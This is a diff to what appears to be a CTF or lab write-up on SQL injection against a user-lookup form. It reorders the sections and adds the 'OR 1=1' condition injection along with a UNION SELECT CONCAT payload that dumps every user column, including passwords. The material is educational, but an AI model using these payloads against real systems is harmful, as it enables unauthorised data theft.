@@ -22,13 +22,39 @@ Surname : me
 
 We can see that the server returns two user fields.
 
+## Simple SQL injection attempt
+
+Starting hacking using a really simple sql injection such as:
+
+Input:
+```sql
+SELECT * from users
+```
+
+Output:
+```sql
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
+```
+
+The server show us the raw MariaDB error, we see that our query has been added to a prebuilt one.
+The prebuild query should look like something:
+```sql
+SELECT first_name, surname FROM users WHERE users.id = ${id} 
+```
+
 ## Condition injection
 
 To be able to retrieve to whole users table entry we need to create a sql query that'is always true.
+We can then add the condition `1=1` always resulting as true.
 
 Input:
 ```sql
 1 OR 1=1
+```
+
+Resulting on the server as:
+```sql
+SELECT first_name, surname FROM users WHERE users.id = 1 OR 1=1
 ```
 
 Output:
@@ -48,22 +74,6 @@ Surname : GetThe
 ```
 
 There are four users in the users table. The last one looks quite suspicious.
-
-## Simple SQL injection attempt
-
-Starting hacking using a really simple sql injection such as:
-
-Input:
-```sql
-SELECT * from users
-```
-
-Output:
-```sql
-You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
-```
-
-The server show us the raw MariaDB error, we see that our query has been added to a prebuilt one.
 
 ## UNION SELECT SQL injection
 
@@ -145,7 +155,7 @@ What we want now is to retrieve all the users entry columns value within on colu
 
 Input:
 ```sql
-1=1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1
+-1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1
 FROM users
 ```
 
